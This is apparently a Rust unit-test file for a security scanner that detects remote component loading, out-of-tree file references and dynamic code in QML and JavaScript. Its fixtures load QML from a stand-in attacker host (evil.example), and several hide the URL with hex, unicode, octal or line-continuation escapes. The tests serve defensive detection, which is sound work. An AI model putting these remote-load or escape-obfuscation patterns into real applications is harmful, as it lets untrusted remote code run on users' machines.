use super::s4_family_tests::{rule_ids, run};
use crate::detect::*;
use omasafe_core::bounds::TimeBudget;

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o644,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: false,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

fn one(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
    super::s4_family_tests::run(
        vec![entry(path, kind, source.len())],
        &[(path, source.as_bytes())],
    )
}

fn rejection_limitations(artifacts: &AnalysisArtifacts) -> Vec<&String> {
    artifacts
        .limitations
        .iter()
        .filter(|limitation| limitation.starts_with("sink-reference-rejected:"))
        .collect()
}

#[test]
fn literal_remote_loader_source_is_a_high_finding() {
    let source = r#"import QtQuick
Item {
    Loader { source: "https://evil.example/W.qml" }
}
"#;
    let (artifacts, _) = one("R.qml", PayloadKind::Qml, source);
    let findings = artifacts.rendered_findings();
    let remote: Vec<_> = findings
        .iter()
        .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
        .collect();
    assert_eq!(remote.len(), 1, "{findings:?}");
    assert_eq!(remote[0].severity, "high");
    assert!(
        remote[0]
            .evidence
            .starts_with("remote-component-load:Loader.source:https://evil.example/W.qml"),
        "{}",
        remote[0].evidence
    );
    // The finding is the disclosure: no sink rejection on top.
    assert!(rejection_limitations(&artifacts).is_empty());
    #[cfg(feature = "qml-parser")]
    assert_eq!(remote[0].confidence.as_deref(), Some("ast-backed"));
    #[cfg(not(feature = "qml-parser"))]
    assert_eq!(remote[0].confidence.as_deref(), Some("lexical-fallback"));
}

#[test]
fn remote_create_component_is_a_high_finding_with_dynamic_code() {
    let source = r#"import QtQuick
Item {
    Component.onCompleted: {
        var c = Qt.createComponent("https://evil.example/W.qml")
    }
}
"#;
    let (artifacts, _) = one("C.qml", PayloadKind::Qml, source);
    let findings = artifacts.rendered_findings();
    let remote: Vec<_> = findings
        .iter()
        .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
        .collect();
    assert_eq!(remote.len(), 1, "{findings:?}");
    assert_eq!(remote[0].severity, "high");
    assert!(
        remote[0]
            .evidence
            .starts_with("remote-component-load:Qt.createComponent:https://"),
        "{}",
        remote[0].evidence
    );
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == DYNAMIC_CODE_RULE),
        "createComponent joins the dynamic-code family: {findings:?}"
    );
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "dynamic-code-execution"),
        "{:?}",
        artifacts.capabilities
    );
}

#[test]
fn remote_directory_import_is_indicator_only() {
    // H0 probe C: remote directory imports are scanner-intercepted on the
    // pinned runtime. Both `as`-qualified and bare spellings record the
    // indicator and must never carry the High remote-load rule.
    let source = r#"import QtQuick
import "https://plugins.example/remote/qml" as Remote
import "https://plugins.example/bare"
Item {}
"#;
    let (artifacts, _) = one("I.qml", PayloadKind::Qml, source);
    let findings = artifacts.rendered_findings();
    assert_eq!(findings.len(), 2, "{findings:?}");
    assert!(
        findings
            .iter()
            .all(|finding| finding.rule_id == REMOTE_DIRECTORY_IMPORT_RULE
                && finding.severity == "low"),
        "{findings:?}"
    );
    assert!(rejection_limitations(&artifacts).is_empty());
}

#[test]
fn local_directory_imports_stay_silent() {
    let source = r#"import QtQuick
import "./widgets" as Widgets
import "widgets"
Item {}
"#;
    let (artifacts, _) = one("L.qml", PayloadKind::Qml, source);
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        rule_ids(&artifacts)
    );
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn out_of_tree_absolute_and_traversal_loads_are_medium_findings() {
    let source = r#"Item {
    Loader { source: "/tmp/staged.qml" }
    Loader { source: "../outside/W.qml" }
}
"#;
    let (artifacts, _) = one("O.qml", PayloadKind::Qml, source);
    let findings = artifacts.rendered_findings();
    assert_eq!(findings.len(), 2, "{findings:?}");
    assert!(
        findings.iter().all(|finding| {
            finding.rule_id == OUT_OF_TREE_REFERENCE_RULE && finding.severity == "medium"
        }),
        "{findings:?}"
    );
    assert!(rejection_limitations(&artifacts).is_empty());
    assert!(
        !rule_ids(&artifacts).contains(&REMOTE_COMPONENT_LOAD_RULE.to_owned()),
        "{ids:?}",
        ids = rule_ids(&artifacts)
    );
}

#[test]
fn qt_include_sinks_split_remote_from_out_of_tree() {
    // Qt.include is a load sink for the Medium out-of-tree rule, but the
    // High remote rule covers only the two H0-verified positions: a
    // remote include surfaces as a typed rejection instead.
    let source = r#"Item {
    Component.onCompleted: {
        Qt.include("/opt/extra.js")
        Qt.include("https://evil.example/extra.js")
        Qt.include("./helper.js")
    }
}
"#;
    let (artifacts, inventory) = run(
        vec![
            entry("I.qml", PayloadKind::Qml, source.len()),
            entry("helper.js", PayloadKind::JavaScript, 16),
        ],
        &[
            ("I.qml", source.as_bytes()),
            ("helper.js", b"// helper\n".repeat(2).as_slice()),
        ],
    );
    let findings = artifacts.rendered_findings();
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == OUT_OF_TREE_REFERENCE_RULE
                && finding.evidence == "out-of-tree-reference:Qt.include:/opt/extra.js"),
        "{findings:?}"
    );
    assert!(
        !findings
            .iter()
            .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
        "Qt.include remote is not the High remote-load rule: {findings:?}"
    );
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
    assert!(
        rejections[0]
            .contains("sink-reference-rejected:remote:I.qml:4:https://evil.example/extra.js")
    );
    // The local relative include still resolves as an invocation edge.
    assert!(
        artifacts
            .edges
            .iter()
            .any(|edge| edge.target_path == "helper.js"),
        "{:?}",
        artifacts.edges
    );
    assert!(inventory.entries[1].invocation_target);
}

#[test]
fn sink_position_rejections_carry_typed_reasons() {
    let source = r#"Item {
    FileView { path: "https://example.test/config" }
    Process { command: ["grim", "-g", "/tmp/shot.png"] }
    Loader { source: "Missing.qml" }
    Loader { source: "qrc:/built-in/Page.qml" }
}
"#;
    let (artifacts, _) = one("S.qml", PayloadKind::Qml, source);
    // Argument and file sinks surface typed rejections, never load-sink
    // findings.
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        rule_ids(&artifacts)
    );
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), 4, "{:?}", artifacts.limitations);
    for expected in [
        "sink-reference-rejected:remote:S.qml:2:https://example.test/config",
        "sink-reference-rejected:absolute:S.qml:3:/tmp/shot.png",
        "sink-reference-rejected:missing-local-target:S.qml:4:Missing.qml",
        "sink-reference-rejected:unsupported-scheme:S.qml:5:qrc:/built-in/Page.qml",
    ] {
        assert!(
            rejections.iter().any(|limitation| **limitation == expected),
            "missing {expected} in {rejections:?}"
        );
    }
}

#[test]
fn non_sink_references_stay_inventory_context() {
    // Icon names, format strings, commented URLs, and any unresolvable
    // path-shaped string outside a sink position produce no finding and
    // no limitation (R-2).
    let source = r#"import QtQuick
Item {
    property string icon: "media-playback-start"
    readonly property string labelPattern: "%1/%2.json"
    Text { text: "%1/%2.json" }
    // see https://example.test/spec for details
    Component.onCompleted: console.log(labelPattern.arg(1).arg(2))
}
"#;
    let (artifacts, _) = one("N.qml", PayloadKind::Qml, source);
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        rule_ids(&artifacts)
    );
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn resolving_sink_references_still_form_edges() {
    let qml = "Item { Loader { source: \"./Panel.qml\" } }\n";
    let (artifacts, inventory) = run(
        vec![
            entry("App.qml", PayloadKind::Qml, qml.len()),
            entry("Panel.qml", PayloadKind::Qml, 10),
        ],
        &[
            ("App.qml", qml.as_bytes()),
            ("Panel.qml", b"Text {}\n".repeat(2).as_slice()),
        ],
    );
    assert!(
        artifacts
            .edges
            .iter()
            .any(|edge| edge.target_path == "Panel.qml"),
        "{:?}",
        artifacts.edges
    );
    assert!(inventory.entries[1].invocation_target);
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn create_component_and_include_join_lexical_dynamic_code() {
    let source = "Qt.createComponent(payload)\nQt.include(module)\n";
    let (artifacts, _) = one("n.js", PayloadKind::JavaScript, source);
    let ids = rule_ids(&artifacts);
    assert_eq!(
        ids.iter().filter(|id| **id == DYNAMIC_CODE_RULE).count(),
        2,
        "{ids:?}"
    );
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "dynamic-code-execution"),
        "{:?}",
        artifacts.capabilities
    );
}

#[test]
fn lexical_lines_carry_sink_rejections_on_standalone_js() {
    // Standalone .js files are always lexical (ADR 0001); a literal
    // createComponent argument outside the tree surfaces its typed
    // rejection there too.
    let source = r#"var component = Qt.createComponent("Missing.qml")
"#;
    let (artifacts, _) = one("view.js", PayloadKind::JavaScript, source);
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
    assert!(
        rejections[0]
            .contains("sink-reference-rejected:missing-local-target:view.js:1:Missing.qml")
    );
}

#[test]
fn analysis_time_budget_still_bounds_rejection_collection() {
    let source = "Loader { source: \"Missing.qml\" }\n";
    let mut inventory = PayloadInventory {
        entries: vec![entry("A.qml", PayloadKind::Qml, source.len())],
        ..Default::default()
    };
    let expired = TimeBudget::new(std::time::Duration::ZERO);
    let artifacts = analyze_inventory(
        &mut inventory,
        &|_| Some(source.as_bytes().to_vec()),
        &expired,
    );
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation == "analysis_time_budget_exhausted")
    );
    assert!(rejection_limitations(&artifacts).is_empty());
}

// -------------------------------------------------------------------
// H2 review boundaries: escape decoding, qualified types, centralized
// scheme parsing, Qt-receiver verification, rejection bounds, and
// lexical span scoping.
// -------------------------------------------------------------------

#[test]
fn escaped_remote_literal_decodes_to_the_runtime_value() {
    // "\x68ttps://…" evaluates to "https://…" at runtime; the escaped
    // spelling must reach the High rule on both extraction paths.
    let source = "Item { Loader { source: \"\\x68ttps://evil.example/W.qml\" } }\n";
    let (artifacts, _) = one("E.qml", PayloadKind::Qml, source);
    let findings = artifacts.rendered_findings();
    let remote: Vec<_> = findings
        .iter()
        .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
        .collect();
    assert_eq!(remote.len(), 1, "{findings:?}");
    assert_eq!(remote[0].severity, "high");
    assert_eq!(
        remote[0].evidence,
        "remote-component-load:Loader.source:https://evil.example/W.qml"
    );
}

#[test]
fn unicode_escape_and_doubled_backslash_are_decoded_exactly_once() {
    // \u0068 is 'h': the createComponent literal is a remote URL.
    let source = "Item { Component.onCompleted: Qt.createComponent(\"\\u0068ttps://evil.example/W.qml\") }\n";
    let (artifacts, _) = one("U.qml", PayloadKind::Qml, source);
    let findings = artifacts.rendered_findings();
    let remote: Vec<_> = findings
        .iter()
        .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
        .collect();
    assert_eq!(remote.len(), 1, "{findings:?}");
    assert_eq!(
        remote[0].evidence,
        "remote-component-load:Qt.createComponent:https://evil.example/W.qml"
    );

    // A literal backslash produced by `\\` must not be re-decoded into
    // scheme characters: the runtime value is "\x68ttps://x", not a URL.
    let literal = "Item { Loader { source: \"\\\\\\x68ttps://x\" } }\n";
    let (artifacts, _) = one("B.qml", PayloadKind::Qml, literal);
    assert!(
        !artifacts
            .rendered_findings()
            .iter()
            .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
        "{:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn qualified_loader_types_reach_the_sink() {
    let qml = r#"import QtQuick as QQ
Item {
    QQ.Loader { source: "https://evil.example/W.qml" }
    QQ.Loader { source: "./Panel.qml" }
    Io.Process { command: ["sh", "-c", "ls"] }
}
"#;
    let (artifacts, inventory) = run(
        vec![
            entry("Q.qml", PayloadKind::Qml, qml.len()),
            entry("Panel.qml", PayloadKind::Qml, 10),
        ],
        &[
            ("Q.qml", qml.as_bytes()),
            ("Panel.qml", b"Text {}\n".repeat(2).as_slice()),
        ],
    );
    let findings = artifacts.rendered_findings();
    let remote: Vec<_> = findings
        .iter()
        .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
        .collect();
    assert_eq!(remote.len(), 1, "{findings:?}");
    assert!(
        remote[0]
            .evidence
            .starts_with("remote-component-load:Loader.source:https://"),
        "{}",
        remote[0].evidence
    );
    // The qualified Process type still surfaces its capability and its
    // argv provenance judgment.
    assert!(
        artifacts
            .capabilities
            .iter()
            .any(|capability| capability.capability == "process-execution"),
        "{:?}",
        artifacts.capabilities
    );
    assert!(
        findings
            .iter()
            .any(|finding| finding.rule_id == PROCESS_RULE),
        "{findings:?}"
    );
    // The local qualified Loader reference still resolves as an edge.
    assert!(
        artifacts
            .edges
            .iter()
            .any(|edge| edge.target_path == "Panel.qml"),
        "{:?}",
        artifacts.edges
    );
    assert!(inventory.entries[1].invocation_target);
}

#[test]
fn scheme_parsing_is_case_insensitive_and_file_urls_are_out_of_tree() {
    let source = r#"Item {
    Loader { source: "HTTPS://evil.example/W.qml" }
    Loader { source: "file:///tmp/X.qml" }
    FileView { path: "file:///etc/example.conf" }
}
"#;
    let (artifacts, _) = one("S2.qml", PayloadKind::Qml, source);
    let findings = artifacts.rendered_findings();
    // Uppercase scheme keeps the High remote verdict, with the original
    // spelling preserved in evidence.
    let remote: Vec<_> = findings
        .iter()
        .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
        .collect();
    assert_eq!(remote.len(), 1, "{findings:?}");
    assert!(
        remote[0]
            .evidence
            .starts_with("remote-component-load:Loader.source:HTTPS://"),
        "{}",
        remote[0].evidence
    );
    // A file:// URL is a local out-of-tree load, never remote and never
    // a mere unsupported scheme.
    let out_of_tree: Vec<_> = findings
        .iter()
        .filter(|finding| finding.rule_id == OUT_OF_TREE_REFERENCE_RULE)
        .collect();
    assert_eq!(out_of_tree.len(), 1, "{findings:?}");
    assert_eq!(out_of_tree[0].severity, "medium");
    assert!(
        out_of_tree[0]
            .evidence
            .starts_with("out-of-tree-reference:Loader.source:file:///tmp/X.qml"),
        "{}",
        out_of_tree[0].evidence
    );
    // file:// at a non-load sink is a typed rejection with the absolute
    // reason.
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
    assert!(
        rejections[0]
            .contains("sink-reference-rejected:absolute:S2.qml:4:file:///etc/example.conf")
    );
}

#[test]
fn non_qt_receivers_do_not_carry_qt_rules() {
    let source = r#"Item {
    Component.onCompleted: {
        backend.createComponent("https://docs.example/X.qml")
        backend.include("/opt/x.js")
    }
}
"#;
    let (artifacts, _) = one("NQ.qml", PayloadKind::Qml, source);
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        rule_ids(&artifacts)
    );
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn non_qt_receivers_stay_quiet_on_lexical_paths() {
    let source = r#"backend.createComponent("https://docs.example/X.qml")
backend.include("/opt/x.js")
var component = Qt.createComponent("Missing.qml")
"#;
    let (artifacts, _) = one("nq.js", PayloadKind::JavaScript, source);
    // The user-defined calls stay context; the Qt-global call on line 3
    // still participates.
    assert!(
        rule_ids(&artifacts)
            .iter()
            .all(|id| id == DYNAMIC_CODE_RULE),
        "{:?}",
        rule_ids(&artifacts)
    );
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
    assert!(rejections[0].contains(":missing-local-target:nq.js:3:Missing.qml"));
}

#[test]
fn sink_rejections_are_capped_and_truncation_is_disclosed() {
    let overflow = 8;
    let count = MAX_SINK_REJECTIONS + overflow;
    let mut source = String::from("Item {\n");
    for index in 0..count {
        source.push_str(&format!(
            "    Loader {{ source: \"Missing{index}.qml\" }}\n"
        ));
    }
    source.push_str("}\n");
    let (artifacts, _) = one("Cap.qml", PayloadKind::Qml, &source);
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), MAX_SINK_REJECTIONS);
    // The truncation count is the number of omitted OCCURRENCES (H2
    // review); here each of the 8 overflow values occurs exactly once.
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation
                == &format!("sink-reference-rejections-truncated:{overflow}")),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn overflow_counts_occurrences_once_the_unique_set_is_full() {
    // Once the retained set is full, omitted rejections are counted per
    // OCCURRENCE (H2 review): remembering which values were omitted
    // would need unbounded fingerprints under adversarial input. Two
    // occurrences of the same value past the full set count as two.
    let mut source = String::from("Item {\n");
    for index in 0..MAX_SINK_REJECTIONS {
        source.push_str(&format!("    Loader {{ source: \"Fill{index}.qml\" }}\n"));
    }
    source.push_str("    Loader { source: \"Over.qml\" } Loader { source: \"Over.qml\" }\n");
    source.push_str("}\n");
    let (artifacts, _) = one("Occ.js", PayloadKind::JavaScript, &source);
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), MAX_SINK_REJECTIONS);
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation == "sink-reference-rejections-truncated:2"),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn duplicate_rejections_do_not_crowd_out_a_later_unique_or_report_truncation() {
    // MAX_SINK_REJECTIONS identical rejections followed by one distinct
    // rejection: the unique one must be retained and no truncation
    // reported, since duplicates carry no new information. The copies must
    // share a line so the rejection strings (which embed the line number)
    // are truly identical.
    let mut source = String::new();
    for _ in 0..MAX_SINK_REJECTIONS {
        source.push_str("Loader { source: \"Dup.qml\" } ");
    }
    source.push_str("Loader { source: \"Unique.qml\" }\n");
    let (artifacts, _) = one("Dupes.js", PayloadKind::JavaScript, &source);
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), 2, "{:?}", artifacts.limitations);
    assert!(
        rejections.iter().any(|r| r.contains(":Unique.qml")),
        "the later unique rejection must survive: {rejections:?}"
    );
    assert!(
        !artifacts
            .limitations
            .iter()
            .any(|limitation| limitation.starts_with("sink-reference-rejections-truncated:")),
        "duplicate-only overflow must not report truncation: {:?}",
        artifacts.limitations
    );
}

#[test]
fn unrelated_literals_on_a_sink_line_do_not_inherit_the_sink() {
    // Lexical span scoping (H2 review): only the binding/call argument
    // span participates, so a second literal sharing the line stays
    // inventory context even in the no-parser build.
    let source = r#"Loader { source: "Panel.qml"; property string docs: "https://docs.example" }
var command = "themes/legacy/x.json"
"#;
    let (artifacts, _) = one("M.js", PayloadKind::JavaScript, source);
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        rule_ids(&artifacts)
    );
    // Only "Panel.qml" is a sink-position rejection; the docs URL and
    // the command string never inherit the sink.
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
    assert!(rejections[0].contains(":missing-local-target:M.js:1:Panel.qml"));
}

#[test]
fn nested_bindings_do_not_inherit_the_outer_loader_sink() {
    // The object brace scope includes nested child objects, so only
    // depth-zero bindings of the matched object may participate (H2
    // review): the nested Image's remote source must not become a
    // Loader.source High finding. `.js` is always lexical.
    let nested = r#"Loader { Image { source: "https://docs.example/logo.qml" } }
"#;
    let (artifacts, _) = one("Nest.js", PayloadKind::JavaScript, nested);
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        rule_ids(&artifacts)
    );
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );

    // The complement: a depth-zero binding of the owning object still
    // participates next to a nested child.
    let mixed = r#"Loader { Image { source: "https://docs.example/logo.qml" } source: "Panel.qml" }
"#;
    let (artifacts, _) = one("Nest2.js", PayloadKind::JavaScript, mixed);
    let rejections = rejection_limitations(&artifacts);
    assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
    assert!(
        rejections[0].contains(":missing-local-target:Nest2.js:1:Panel.qml"),
        "{rejections:?}"
    );
}

#[cfg(feature = "qml-parser")]
#[test]
fn nested_qml_bindings_do_not_inherit_the_outer_loader_sink_ast() {
    // AST parity: the nested Image is its own object definition and its
    // remote source is not a Loader sink.
    let source = "Item { Loader { Image { source: \"https://docs.example/logo.qml\" } } }\n";
    let (artifacts, _) = one("Nest.qml", PayloadKind::Qml, source);
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        rule_ids(&artifacts)
    );
    assert!(
        artifacts.limitations.is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[test]
fn lexical_dynamic_code_follows_the_qt_receiver_rule() {
    // `backend.Qt.createComponent(...)` is a member named Qt — dynamic
    // code must NOT fire (H2 review); `Qt . createComponent(...)` with
    // whitespace around the dot IS the Qt API and must fire BOTH the
    // dynamic-code finding and the remote-load finding.
    let member = "var c = backend.Qt.createComponent(payload)\n";
    let (artifacts, _) = one("dm.js", PayloadKind::JavaScript, member);
    assert!(
        rule_ids(&artifacts).is_empty(),
        "{:?}",
        rule_ids(&artifacts)
    );

    let spaced = "var c = Qt . createComponent(\"https://evil.example/W.qml\")\n";
    let (artifacts, _) = one("ds.js", PayloadKind::JavaScript, spaced);
    let ids = rule_ids(&artifacts);
    assert!(
        ids.contains(&DYNAMIC_CODE_RULE.to_owned()),
        "spaced Qt.createComponent must carry dynamic code: {ids:?}"
    );
    assert!(
        ids.contains(&REMOTE_COMPONENT_LOAD_RULE.to_owned()),
        "spaced Qt.createComponent must carry the remote-load rule: {ids:?}"
    );
}

#[test]
fn line_continuation_and_legacy_octal_escapes_decode_to_runtime_values() {
    // Backslash + line terminator is a continuation: it evaluates to the
    // empty string, so `"ht\<LF>tps://…"` is `https://…` at runtime.
    assert_eq!(decode_js_escapes("ht\\\ntps://x"), "https://x");
    assert_eq!(decode_js_escapes("a\\\r\nb"), "ab"); // CRLF is one sequence
    assert_eq!(decode_js_escapes("a\\\rb"), "ab"); // lone CR
    assert_eq!(decode_js_escapes("a\\\u{2028}b"), "ab"); // line separator
    assert_eq!(decode_js_escapes("a\\\u{2029}b"), "ab"); // paragraph separator
    // Legacy octal escapes (Annex B): value is the octal number.
    assert_eq!(decode_js_escapes("\\101"), "A"); // \101 == 'A'
    assert_eq!(decode_js_escapes("\\1"), "\u{0001}"); // single octal digit
    assert_eq!(decode_js_escapes("\\0"), "\0"); // NUL
    assert_eq!(decode_js_escapes("\\478"), "'8"); // 4-7 caps at two digits: \47='\'' then '8'
}

#[test]
fn line_continuation_in_a_load_sink_still_reaches_the_high_rule() {
    // A continuation splits an https URL across the escape; the decoded
    // runtime value is a remote load and must not slip past the rule. The
    // AST build parses the multi-line string as one literal.
    #[cfg(feature = "qml-parser")]
    {
        let source = "Item { Loader { source: \"ht\\\ntps://evil.example/W.qml\" } }\n";
        let (artifacts, _) = one("LC.qml", PayloadKind::Qml, source);
        let remote: Vec<_> = artifacts
            .rendered_findings()
            .into_iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{:?}", artifacts.rendered_findings());
        assert_eq!(
            remote[0].evidence,
            "remote-component-load:Loader.source:https://evil.example/W.qml"
        );
    }
}

#[cfg(feature = "qml-parser")]
#[test]
fn parenthesized_qt_receiver_still_reaches_the_sink() {
    // `(Qt).createComponent(...)` is the same Qt-global call; the
    // parenthesized receiver must be unwrapped before the receiver check.
    let source =
        "Item { Component.onCompleted: (Qt).createComponent(\"https://evil.example/W.qml\") }\n";
    let (artifacts, _) = one("PQ.qml", PayloadKind::Qml, source);
    let remote: Vec<_> = artifacts
        .rendered_findings()
        .into_iter()
        .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
        .collect();
    assert_eq!(remote.len(), 1, "{:?}", artifacts.rendered_findings());
}

#[test]
fn lexical_qt_matching_is_receiver_exact() {
    // A member named Qt (`backend.Qt.createComponent`) is NOT the Qt
    // global and must not produce a High finding. `.js` is always lexical.
    let miss = "var c = backend.Qt.createComponent(\"https://docs.example/X.qml\")\n";
    let (artifacts, _) = one("miss.js", PayloadKind::JavaScript, miss);
    assert!(
        !artifacts
            .rendered_findings()
            .iter()
            .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
        "member Qt must not match: {:?}",
        artifacts.rendered_findings()
    );

    // Whitespace around the dot is still the Qt global: High.
    let hit = "var c = Qt . createComponent(\"https://evil.example/W.qml\")\n";
    let (artifacts, _) = one("hit.js", PayloadKind::JavaScript, hit);
    assert!(
        artifacts
            .rendered_findings()
            .iter()
            .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
        "spaced Qt.createComponent must match: {:?}",
        artifacts.rendered_findings()
    );
}

#[test]
fn lexical_qt_sink_marks_only_the_first_argument() {
    // Only the first argument of createComponent is the loaded URL; a URL
    // in a later argument must not become a High finding.
    let source = "var c = Qt.createComponent(mode, \"https://evil.example/W.qml\")\n";
    let (artifacts, _) = one("arg.js", PayloadKind::JavaScript, source);
    assert!(
        !artifacts
            .rendered_findings()
            .iter()
            .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
        "second-argument URL must not be marked: {:?}",
        artifacts.rendered_findings()
    );
}

#[cfg(not(feature = "qml-parser"))]
#[test]
fn lexical_binding_is_scoped_to_the_objects_braces() {
    // `Image.source` must not be attributed to the adjacent `Loader`:
    // the binding is scoped to the matching object's brace span, not the
    // shared line, so no false High finding in the lexical build.
    let source = "Loader {} Image { source: \"https://docs.example/logo.qml\" }\n";
    let (artifacts, _) = one("BS.qml", PayloadKind::Qml, source);
    assert!(
        !artifacts
            .rendered_findings()
            .iter()
            .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
        "Image.source is not Loader.source: {:?}",
        artifacts.rendered_findings()
    );
    // And it is not even recorded as a Loader sink rejection.
    assert!(
        rejection_limitations(&artifacts).is_empty(),
        "{:?}",
        artifacts.limitations
    );
}

#[cfg(not(feature = "qml-parser"))]
#[test]
fn lexical_scoped_binding_still_finds_the_owning_objects_sink() {
    // The complement of the scoping fix: a same-line Loader with its own
    // remote source is still a High finding.
    let source = "Row { Loader { source: \"https://evil.example/W.qml\" } }\n";
    let (artifacts, _) = one("BS2.qml", PayloadKind::Qml, source);
    assert!(
        artifacts
            .rendered_findings()
            .iter()
            .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
        "the owning Loader's remote source must still fire: {:?}",
        artifacts.rendered_findings()
    );
}
